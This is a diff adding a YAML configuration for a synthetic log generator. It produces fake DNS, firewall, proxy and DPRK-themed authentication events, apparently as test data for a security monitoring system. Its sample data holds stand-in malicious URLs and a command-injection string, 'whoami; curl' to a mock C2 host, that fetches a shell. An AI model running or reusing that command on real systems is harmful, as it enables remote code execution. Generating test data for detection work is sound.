@@ -1,0 +1,151 @@
+generators:
+  dns:
+    output_format: "syslog"
+    timestamp_format: "%d-%b-%Y %H:%M:%S.%f"
+    syslog_facility: "user"
+    schema:
+      template: "{timestamp} client @0x{hex_id} {src_ip}#{src_port} ({query_domain}): query: {query_domain} IN {query_type} {flags} ({resolver_ip})"
+      fields:
+        hex_id: "random_hex:12"
+        src_port: "random_int:10000:65535"
+        flags: ["+", "+E(0)", "+E(0)K", "+T", "+TC"]
+    data:
+      domains:
+        - ["A", "example.com"]
+        - ["AAAA", "apple.com"]
+        - ["CNAME", "okta.com"]
+        - ["MX", "mail.google.com"]
+    defaults:
+      src_cidrs: "192.168.0.0/16"
+
+  firewall:
+    output_format: "syslog"
+    timestamp_format: "%b %d %H:%M:%S"
+    syslog_facility: "local0"
+    schema:
+      template: "{timestamp} filterlog: {rule},{sub_rule},{anchor},{tracker},{interface},{reason},{action},{direction},{ipver},{ipv4_data},{ip_data},{proto_specific}"
+      fields:
+        rule: "random_int:1:1000"
+        sub_rule: ""
+        anchor: ""
+        tracker: "random_int:100000:999999"
+        interface: ["wan", "lan", "igb0", "em0"]
+        reason: "match"
+        action: ["pass", "block"]
+        direction: ["in", "out"]
+        ipver: "4"
+        tos: "0x0"
+        ecn: ""
+        ttl: "random_int:64:128"
+        id: "random_int:1:65535"
+        offset: "0"
+        flags: ["DF", "none"]
+        length: "random_int:40:1500"
+        data_len: "random_int:0:1400"
+        tcp_flags: ["S", "SA", "F", "R", "PA"]
+        seq: "random_int:1000000000:4294967295"
+        ack: "random_int:0:4294967295"
+        window: "random_int:8192:65535"
+        urg: ""
+        options: ""
+    data:
+      targets:
+        - ["1.1.1.1", "53", "udp"]
+        - ["8.8.8.8", "443", "tcp"]
+        - ["93.184.216.34", "80", "tcp"]
+        - ["192.0.2.1", "22", "tcp"]
+    defaults:
+      src_cidrs: "10.0.0.0/8,192.168.0.0/16"
+
+  proxy:
+    output_format: "syslog"
+    timestamp_format: "unix_ms"
+    syslog_facility: "user"
+    schema:
+      template: "{timestamp} {elapsed:>6} {client_ip} {code}/{status:03d} {bytes_sent} {method} {url} {user} {hierarchy}/{peer} {content_type}"
+      fields:
+        elapsed: "random_int:1:5000"
+        code: ["TCP_MISS", "TCP_HIT", "TCP_DENIED", "UDP_DENIED"]
+        status: [200, 301, 404, 403, 502]
+        bytes_sent: "random_int:100:100000"
+        user: "-"
+        hierarchy: ["DIRECT", "NONE", "PARENT_HIT"]
+        content_type: ["text/html", "application/json", "image/jpeg", "application/octet-stream"]
+    data:
+      sites:
+        - ["GET", "https://google.com"]
+        - ["POST", "https://api.postman.com"]
+        - ["CONNECT", "evil.site:443"]
+        - ["GET", "http://malicious.com/evil.exe"]
+    defaults:
+      src_cidrs: "192.168.0.0/16"
+
+  ingress_auth:
+    output_format: "socket"
+    timestamp_format: "iso8601_ms"
+    schema:
+      format: "json"
+      template:
+        version: "v1"
+        event_type: "INGRESS_AUTHENTICATION"
+        time: "{timestamp}"
+        account: "{random_username}"
+        account_domain: "{domain}"
+        source_ip: "{random_nk_ip}"
+        authentication_result: "{random_auth_result}"
+        authentication_target: "{random_auth_target}"
+        custom_data: "{random_custom_data}"  # 80% chance
+    data:
+      domain: "DPRK"
+      auth_results: ["SUCCESS", "FAILURE"]
+      usernames:
+        - "a-kimjongun"
+        - "kim-il-sung"
+        - "kim-yo-jong"
+        - "rgb_general"
+        - "hidden_cobra"
+        - "lazarus_admin"
+        - "chollima"
+      auth_targets:
+        - "Sony Pictures Backup Server"
+        - "WannaCry Glitter Bomb"
+        - "ByBit Secure Admin Panel"
+        - "Bangladesh Central Bank SWIFT"
+        - "Equifax Data Vault"
+        - "NSA Toolkit Repository"
+        - "Coinbase Cold Wallet Access"
+        - "US Treasury Sanctions Database"
+      ip_ranges:
+        - ["175.45.176.0", "175.45.179.255"]
+        - ["210.52.109.0", "210.52.109.255"]
+        - ["77.94.35.0", "77.94.35.255"]
+        - ["91.192.148.0", "91.192.148.255"]
+      custom_data_pool:
+        - c2_server: "nk-hack.pyongyang.kp:8443"
+        - malware_hash: "dynamic_32_hex"
+        - stolen_cred_count:
+            type: "random_int"
+            min: 10000
+            max: 500000
+        - ransomware_payload: "WannaCry_v3_encrypted.bin"
+        - phishing_campaign: "SpearPhish_SonyExec_2025Q1"
+        - apt_operation: "Hidden Cobra OP_Starlight"
+        - crypto_wallet_target: "dynamic_40_hex"
+        - exfil_data_size:
+            type: "random_int"
+            min: 500000000
+            max: 5000000000
+        - backdoor_key: "juche_dynamic_16_alphanum"
+        - target_breach: "SWIFT_Transaction_Log_2025"
+        - lazarus_signature: "RGB_Sector7_Exploit"
+        - spearphish_email: "ceo.sony@nk-spoof.kp"
+        - command_injected: "whoami; curl http://nk-c2.kp/shell"
+        - crypto_heist_value:
+            type: "random_int"
+            min: 1000000000
+            max: 10000000000
+        - recon_target: "FBI_Cyber_Division_Network"
+    defaults:
+      custom_data_chance: 0.8
+      target_host: "insight-idr"
+      target_port: 1337
